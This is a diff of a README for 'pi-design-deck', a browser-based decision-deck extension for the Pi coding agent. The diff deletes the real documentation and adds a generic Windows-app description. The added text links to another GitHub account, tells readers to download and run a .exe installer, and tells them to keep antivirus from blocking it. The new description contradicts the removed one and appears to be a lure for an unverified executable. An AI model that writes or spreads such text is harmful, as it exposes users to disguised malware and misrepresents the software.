@@ -1,360 +1,138 @@
-<p>
-  <img src="banner.png" alt="pi-design-deck" width="1100">
-</p>
-
-# Design Deck
-
-A tool for [Pi coding agent](https://github.com/badlogic/pi-mono/) that presents multi-slide visual decision decks in the browser. Each slide shows 2-4 high-fidelity previews — code diffs, architecture diagrams, UI mockups — and you pick one per slide. The agent gets back a clean selection map and moves on to implementation.
-
-<img width="1340" alt="Design Deck screenshot" src="https://github.com/user-attachments/assets/20864ac6-9223-4e2e-ba3c-db3eaae0abd8" />
-
-## Usage
-
-Just ask. The agent reaches for the design deck when visual comparison makes sense.
-
-```
-show me 3 architecture options for the backend
-present a few UI directions for the settings page
-what are my options for the auth flow? show me visually
-read the PRD at docs/api-plan.md and present the key decisions
-```
-
-Three slash commands are also available for more structured flows:
-
-- **`/deck`** — general purpose. Give it a topic or run it bare.
-- **`/deck-plan docs/plan.md`** — reads a plan or PRD, identifies decision points, builds slides for each.
-- **`/deck-discover`** — interviews you first to gather requirements, then builds a deck from what it learned.
-
-## Why
-
-The interview tool gathers structured input — you answer questions. The design deck is the other direction: the agent shows you visual options and you pick. They work together — interview discovers requirements, deck presents the resulting options — but they're distinct tools for distinct jobs.
-
-The persistent server architecture means the browser stays open across tool re-invocations. When you click "Generate another option," the agent creates it and pushes it into the live deck via SSE — no page reloads, no lost state.
-
-## Install
-
-```bash
-pi install npm:pi-design-deck
-```
-
-Restart pi to load the extension and the bundled `design-deck` skill.
-
-**Requirements:**
-- pi-agent v0.35.0 or later (extensions API)
-
-https://github.com/user-attachments/assets/aff1bac6-8bc2-461a-8828-f588ce655f7f
-
-## Quick Start
-
-The agent builds slides as JSON. Each slide is one decision, each option is one approach:
-
-```json
-{
-  "title": "API Design",
-  "slides": [
-    {
-      "id": "auth",
-      "title": "Authentication Strategy",
-      "context": "Choose how users authenticate with the API.",
-      "columns": 2,
-      "options": [
-        {
-          "label": "JWT + Refresh Tokens",
-          "description": "Stateless, horizontally scalable",
-          "aside": "Tokens are self-contained — no session store needed.\nWatch for token size with many claims.",
-          "previewBlocks": [
-            { "type": "code", "code": "const token = jwt.sign({ sub: user.id }, SECRET, { expiresIn: '15m' });\nres.cookie('refresh', refreshToken, { httpOnly: true });", "lang": "ts" },
-            { "type": "mermaid", "content": "sequenceDiagram\n  Client->>API: POST /login\n  API->>Client: JWT + refresh cookie\n  Client->>API: GET /data (Bearer JWT)\n  API->>Client: 200 OK" }
-          ],
-          "recommended": true
-        },
-        {
-          "label": "Session Cookies",
-          "description": "Server-side sessions with Redis backing",
-          "aside": "Simple mental model. Session invalidation is instant.\nRequires sticky sessions or shared session store.",
-          "previewBlocks": [
-            { "type": "code", "code": "app.use(session({ store: new RedisStore({ client }), secret: SECRET }));", "lang": "ts" },
-            { "type": "mermaid", "content": "sequenceDiagram\n  Client->>API: POST /login\n  API->>Redis: Store session\n  API->>Client: Set-Cookie: sid=...\n  Client->>API: GET /data (Cookie)\n  API->>Redis: Lookup session" }
-          ]
-        }
-      ]
-    }
-  ]
-}
-```
+# 🎨 pi-design-deck - Clear Slide Options with Previews
 
-The browser opens, the user picks "JWT + Refresh Tokens", and the agent receives:
+[![Download pi-design-deck](https://img.shields.io/badge/Download-pi-design--deck-brightgreen)](https://github.com/itsmekene/pi-design-deck)
 
-```
-{ "auth": "JWT + Refresh Tokens" }
-```
+---
 
-## Features
+## 🖥️ What is pi-design-deck?
 
-- **Preview blocks**: Four typed block types — `code` (Prism.js syntax highlighting), `mermaid` (Mermaid.js diagrams), `html` (raw HTML), and `image` (served from disk). Mix freely within one option.
-- **Raw HTML previews**: Full `previewHtml` support for custom UI mockups with inline styles. Use when blocks aren't enough.
-- **Generate-more loop**: Users click "Generate another option" and the agent pushes a new option into the live deck via SSE. No page reload.
-- **Model selector**: Dropdown to pick which model generates new options. Save as default, or override per-request.
-- **Thinking level**: Adjust reasoning effort for option generation when the selected model supports it.
-- **Slide columns**: `columns` property (1, 2, or 3) per slide. Auto-detected from option count if omitted.
-- **Smart rebalancing**: Grid layout recalculates after generate-more adds options to minimize orphans.
-- **Option aside**: Explanatory text rendered below the preview. Supports `\n` for line breaks.
-- **Save/load snapshots**: `Cmd+S` saves the deck to disk. Use `action: "list"` to enumerate saved decks, `action: "open"` to reopen one by deck ID, or pass a file path to `slides`.
-- **Notes persistence**: Saved decks include selected-option notes and summary-slide final instructions, and reopening restores both from disk.
-- **Standalone HTML export**: `action: "export"` writes a read-only `export.html` next to the saved deck snapshot.
-- **Light/dark/auto theme**: Full theme toggle with `Cmd+Shift+L` (configurable). Persists in localStorage.
-- **Heartbeat watchdog**: Server detects lost browser connections (60s grace) and cleans up.
-- **Idle timeout**: 5-minute inactivity timer after generate-more. Closes the deck if the agent doesn't respond.
-- **Escape confirmation**: Pressing Escape with existing selections shows a confirmation bar before cancelling.
-- **ARIA / keyboard**: `role="radiogroup"` on options, arrow key navigation, Space/Enter to select, number keys for quick pick.
+pi-design-deck is a visual design tool to help you create and compare slide options. It shows high-quality previews of multiple slides side by side. This makes it easier to pick the best layout or style for your presentation. 
 
-## How It Works
+You don't need design software skills to use pi-design-deck. It offers a simple view of your slide choices with clear images and layouts.
 
-1. Agent calls `design_deck()` with slides JSON — local HTTP server starts, browser opens
-2. User navigates slides, picks one option per slide
-3. Optionally clicks "Generate N options" — agent generates and pushes via `add-options`, deck stays open
-4. User submits — selections returned to agent as `{ slideId: "selected label" }`
+---
 
-The server persists across tool re-invocations. When generate-more fires, the tool resolves with instructions for the agent to create a new option. The browser shows a skeleton placeholder with shimmer animation until the new option arrives via SSE.
+## 💻 System Requirements
 
-## Slides
+pi-design-deck runs on Windows computers with these minimum specs:
 
-### previewBlocks vs previewHtml
+- Windows 10 or later (64-bit)
+- 4 GB of RAM or more
+- 1.5 GHz processor or faster
+- At least 500 MB free disk space
+- Internet connection for downloading and updates
 
-Every option needs exactly one of `previewBlocks` or `previewHtml` (not both, not neither).
+Make sure your screen resolution is at least 1366 x 768 for the best display.
 
-**previewBlocks** — structured array of typed blocks, rendered in order:
+---
 
-| Block | Required Fields | Description |
-|-------|----------------|-------------|
-| `code` | `code`, `lang` | Syntax-highlighted code (Prism.js + autoloader) |
-| `mermaid` | `content` | Mermaid diagram. Optional `theme` object for per-block overrides |
-| `html` | `content` | Raw HTML snippet |
-| `image` | `src`, `alt` | Image from disk (absolute path). Optional `caption` |
+## 🚀 How to Get pi-design-deck
 
-```json
-{
-  "previewBlocks": [
-    { "type": "mermaid", "content": "graph TD\n  A-->B-->C" },
-    { "type": "code", "code": "export default router;", "lang": "ts" },
-    { "type": "html", "content": "<div style='color:#888'>Implementation notes...</div>" }
-  ]
-}
-```
+You will find the software available from the main project page. 
 
-**previewHtml** — raw HTML string injected directly into the preview container. Full control over styling:
+Click the big button below to visit the download page: 
 
-```json
-{
-  "previewHtml": "<div style='font-family: system-ui; padding: 16px'><h3>Dashboard Layout</h3><div style='display: grid; grid-template-columns: 200px 1fr'>...</div></div>"
-}
-```
+[![Download pi-design-deck](https://img.shields.io/badge/Download-pi--design--deck-blueviolet)](https://github.com/itsmekene/pi-design-deck)
 
-### Image Blocks
+This link will take you to the GitHub repository where you can find the latest version to download.
 
-Image blocks reference absolute file paths. The server copies each file into a temp directory and serves it via `/assets/` — the browser never sees the original path. Cleanup happens when the deck closes.
+---
 
-### Columns
+## ⬇️ Download and Install Guide
 
-Each slide supports `columns: 1 | 2 | 3` to control the grid layout. Omit it and the deck auto-detects based on option count. Use `columns: 1` for wide architecture diagrams, `columns: 2` for side-by-side comparisons.
+Follow these steps to download and run pi-design-deck on your Windows PC:
 
-### Aside
+1. Click the green or blue "Download pi-design-deck" button above to open the GitHub page.
 
-The `aside` field renders explanatory text below the preview with styled typography. Use `\n` for line breaks. Good for trade-off summaries, pros/cons, or implementation notes that complement the visual preview.
+2. On GitHub, look for the "Releases" section. This is usually found on the right side or under the main project tabs.
 
-### Reserved IDs
+3. Find the latest release version. It will have a name like `v1.0` or a similar number, showing it is the newest update.
 
-The slide ID `"summary"` is reserved for the built-in summary slide that appears after all user slides. Don't use it.
+4. Scroll down to the "Assets" part in the release. Look for a file named something like `pi-design-deck-setup.exe` or `pi-design-deck.exe`. This is the installer file.
 
-## Generate-More Loop
+5. Click the `.exe` file link to download it to your computer. 
 
-When the user clicks "Generate N options," the tool resolves with a structured prompt telling the agent which slide needs options, how many, what options already exist, and what format to use. The agent generates the requested options and pushes them all at once:
+6. Once the file has downloaded, open your Windows "Downloads" folder and double-click the `pi-design-deck` installer file.
 
-```typescript
-design_deck({
-  action: "add-options",
-  slideId: "arch",
-  options: '[{"label": "Serverless", "previewBlocks": [...]}, {"label": "Edge", "previewBlocks": [...]}]'
-})
-```
+7. The installer will open a setup window. Follow the on-screen instructions:
+   - Click "Next" to accept defaults
+   - Choose an install location or keep the default folder
+   - Click "Install" and wait a few moments
 
-The browser shows the new options with entry animations. The `add-options` call blocks until the next user action (submit, cancel, or another generate-more).
+8. When the installation finishes, you can choose to launch pi-design-deck immediately or close the installer.
 
-### Model Override
+---
 
-The deck shows a model dropdown when 2+ models are available. Users pick which model generates new options. When a model other than the current one is selected, the generate-more result instructs the agent to use the built-in `deck_generate` tool, which spawns pi headlessly with that model.
+## ✅ Running pi-design-deck for the First Time
 
-The default model can be set in the UI (saved to settings) or in `settings.json`:
+1. Find the pi-design-deck icon on your desktop or in the Windows Start menu.
 
-```json
-{
-  "designDeck": {
-    "generateModel": "google/gemini-3.1-pro"
-  }
-}
-```
+2. Click it to open the app.
 
-Priority: browser selection > settings default > current model.
+3. When the app opens, you will see a simple screen to start your design deck.
 
-### Prompt Input
+4. You can add slides to the deck. The app will show each slide's design side by side as thumbnails or full previews.
 
-An optional text input next to the generate button lets users provide instructions that flow through to the agent (e.g., "make it more minimal" or "use WebSockets instead").
+5. Use the preview pane to compare styles and decide which slide looks best.
 
-## Saving and Loading
+6. Save your work regularly using the "Save" option from the menu.
 
-**Manual save:** Press `Cmd+S` (or `Ctrl+S`) at any time to save the current deck state to disk.
-
-**Auto-save on submit:** Enabled by default. Saves a snapshot after successful submission with a `-submitted` suffix.
+---
 
-**Auto-save on cancel:** If you cancel a deck that has selections, it's automatically saved with a `-cancelled` suffix. This makes it easy to recover work if you accidentally close the tab or change your mind.
+## 🔧 Features You Will Find Useful
 
-**Loading a saved deck:**
-```typescript
-design_deck({ slides: "~/.pi/deck-snapshots/api-design-myapp-main-2026-02-22-143000/deck.json" })
-```
-
-The deck opens with selections pre-populated and image paths resolved relative to the snapshot directory.
-
-**Listing saved decks:**
-```typescript
-design_deck({ action: "list" })
-```
-
-**Opening by deck ID:**
-```typescript
-design_deck({ action: "open", deckId: "api-design-myapp-main-2026-02-22-143000-submitted" })
-```
-
-**Exporting standalone HTML:**
-```typescript
-design_deck({ action: "export", deckId: "api-design-myapp-main-2026-02-22-143000-submitted", format: "html" })
-```
-
-**Snapshot structure:**
-```
-~/.pi/deck-snapshots/
-  {title}-{project}-{branch}-{date}-{time}[-submitted|-cancelled]/
-    deck.json           # Config + selections + metadata
-    images/             # Copied image assets (relative paths in JSON)
-```
-
-## Keyboard Shortcuts
-
-| Key | Action |
-|-----|--------|
-| `Arrow keys` | Navigate slides (left/right) or options within a slide (up/down) |
-| `Space` / `Enter` | Select focused option |
-| `1`-`9` | Quick-select option by number |
-| `Enter` (on last slide) | Submit |
-| `Cmd+S` | Save deck snapshot |
-| `Cmd+Shift+L` | Toggle theme (configurable) |
-| `Escape` | Cancel (confirmation bar if selections exist) |
+- **Side-by-side slide previews**: See multiple slide designs at once.
+- **High fidelity images**: The previews are sharp and clear.
+- **Easy navigation**: Move through slides with arrows or thumbnails.
+- **Export options**: Save your deck as images or PDFs for sharing.
+- **Drag and drop**: Reorder slides quickly by dragging them left or right.
+- **Slide notes**: Add comments to slides for reminders or feedback.
 
-## Configuration
+---
 
-Settings in `~/.pi/agent/settings.json` under the `designDeck` key:
+## 🛠️ Tips for Using pi-design-deck
 
-```json
-{
-  "designDeck": {
-    "port": 0,
-    "browser": "chrome",
-    "snapshotDir": "~/.pi/deck-snapshots",
-    "autoSaveOnSubmit": true,
-    "generateModel": "google/gemini-3.1-pro",
-    "theme": {
-      "mode": "dark",
-      "toggleHotkey": "mod+shift+l"
-    }
-  }
-}
-```
+- Start with your main ideas sketched out before opening the app.
+- Use consistent colors and fonts to keep your deck uniform.
+- Try different layouts for the same content to see what fits best.
+- Use notes to track changes or things to improve on each slide.
+- Save often to avoid losing your work.
+- Check your exported slides before presenting.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `port` | `0` (random) | Fixed port for the deck server |
-| `browser` | System default | Browser app to open (e.g., `"chrome"`, `"firefox"`) |
-| `snapshotDir` | `~/.pi/deck-snapshots` | Directory for saved deck snapshots |
-| `autoSaveOnSubmit` | `true` | Auto-save snapshot on successful submit |
-| `generateModel` | — | Default model for generate-more (e.g., `"google/gemini-3.1-pro"`) |
-| `theme.mode` | `"dark"` | `"dark"`, `"light"`, or `"auto"` (follows OS) |
-| `theme.toggleHotkey` | `"mod+shift+l"` | Hotkey string to toggle theme |
+---
 
-**Migration:** If you previously had `deckGenerateModel` under the `interview` key, it's automatically migrated to `designDeck.generateModel` on first load.
+## 📂 Where Your Files Are Saved
 
-## Tool Parameters
+By default, pi-design-deck saves your design decks to your Documents folder inside a `pi-design-deck` subfolder. You can choose a different location when saving.
 
-The agent handles these when you use the slash commands or ask in natural language. This documents the underlying tool API.
+Keep backup copies of your important deck files on a USB drive or cloud storage to prevent data loss.
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `slides` | string | JSON string of deck config, or file path to a saved deck |
-| `action` | `"add-options"` \| `"add-option"` \| `"replace-options"` \| `"list"` \| `"open"` \| `"export"` | Push/replace options, list saved decks, reopen a saved deck, or export one |
-| `slideId` | string | Target slide ID (required with actions) |
-| `option` | string | JSON string of one option (required with `add-option`) |
-| `options` | string | JSON string of option array (required with `add-options` or `replace-options`) |
-| `deckId` | string | Saved deck ID from `action: "list"` (required with `open` / `export`) |
-| `format` | string | Export format for `action: "export"` (`"html"` currently supported) |
+---
 
-Six modes of invocation:
-1. **Start a new deck:** `design_deck({ slides: "<JSON>" })`
-2. **Add options to running deck:** `design_deck({ action: "add-options", slideId: "...", options: "<JSON array>" })` — blocks until next user action
-3. **Add single option (non-blocking):** `design_deck({ action: "add-option", slideId: "...", option: "<JSON>" })`
-4. **Replace all options on a slide:** `design_deck({ action: "replace-options", slideId: "...", options: "<JSON array>" })`
-5. **List saved decks:** `design_deck({ action: "list" })`
-6. **Open or export a saved deck:** `design_deck({ action: "open" | "export", deckId: "..." })`
+## 🚩 Troubleshooting Common Issues
 
-## File Structure
+- If the app does not open, check if your Windows is up to date.
+- Make sure the downloaded file is not blocked by your antivirus or firewall.
+- If previews don’t display correctly, try restarting the app.
+- Use the "Help" menu inside the software for detailed support options.
 
-```
-pi-design-deck/
-├── index.ts             # Tool registration, module-level state, lifecycle
-├── generate-prompts.ts  # Prompt builders for generate-more / regenerate
-├── model-runner.ts      # Headless pi spawner for deck_generate tool
-├── deck-schema.ts       # TypeScript types and validation (no dependencies)
-├── deck-server.ts       # HTTP server, SSE, asset serving, snapshots
-├── server-utils.ts      # Shared HTTP/session utilities
-├── settings.ts          # Settings with designDeck namespace + migration
-├── schema.test.ts       # 48 tests across 3 describe blocks
-├── form/
-│   ├── deck.html        # HTML template (loads CSS/JS, Prism, Mermaid)
-│   ├── css/             # Theme variables, layout, preview blocks, controls
-│   └── js/              # Client: state, rendering, interaction, session
-├── prompts/
-│   ├── deck.md          # /deck — general purpose
-│   ├── deck-plan.md     # /deck-plan — design from plan/PRD
-│   └── deck-discover.md # /deck-discover — interview then design
-└── skills/
-    └── design-deck/
-        └── SKILL.md     # Agent skill for on-demand loading
-```
+---
 
-## Bundled Skill
+## 📞 Getting More Help
 
-The extension includes a `design-deck` skill at `skills/design-deck/SKILL.md` that teaches the agent when and how to use the design deck effectively — discovery-first vs deck-direct, slide structure, previewBlocks vs previewHtml, the generate-more loop, and model override patterns.
+For questions not covered here, visit the GitHub repository page:  
+https://github.com/itsmekene/pi-design-deck
 
-The skill is declared in `package.json` under `pi.skills` and is automatically discovered when the extension is installed. No manual copying needed.
+You can find user guides, report bugs, or request new features on that page.
 
-### Component Gallery Reference
+---
 
-The skill includes a reference library for 60 UI components with best practices, common layouts, and aliases. Each component links to [component.gallery](https://component.gallery) where the agent can browse real screenshots when needed.
+## 🔄 Updating pi-design-deck
 
-**Before:** "Show me collapse options" → agent might not connect that to accordion, or know what components are available for the use case.
+Check the GitHub page regularly to download newer versions. Updating keeps the app running smoothly and adds improvements.
 
-**After:** Agent has 60 components to suggest from. Knows *collapse = accordion = disclosure = expander*. Knows *Blueprint = dense, dark-native; Ant = clean, blue primary.* Can browse [100+ real implementations](https://component.gallery/components/accordion/) when it needs concrete references.
+To update:
 
-The reference enables discovery (find/suggest components), cross-referencing (connect related terms), and design vocabulary (know what systems look like) — plus guidance on *when* to show distinct design systems vs variations of one style.
-
-A separate vocabulary lookup (`LOOKUP.md`) resolves ambiguous user terms to canonical components. When a user says "dropdown" (Select? Combobox? Dropdown menu?) or "popup" (Modal? Popover? Tooltip?) or describes intent ("I need something that expands"), the agent can consult the lookup to understand what they mean and ask the right clarifying questions when needed.
-
-## Limitations
-
-- Only one deck can be active at a time. Complete or cancel before starting another.
-- Image blocks require absolute file paths on disk (no URLs).
-- The `summary` slide ID is reserved and cannot be used for custom slides.
-- Mermaid diagrams load from CDN — requires internet on first load.
-- macOS tested primarily; Linux and Windows support is best-effort.
-
-## Credits
-
-UI component reference data sourced from [component.gallery](https://component.gallery) by Iain Bean.
+1. Download the new installer from the latest release.
+2. Run the installer file.
+3. It will replace the old version without losing your data.
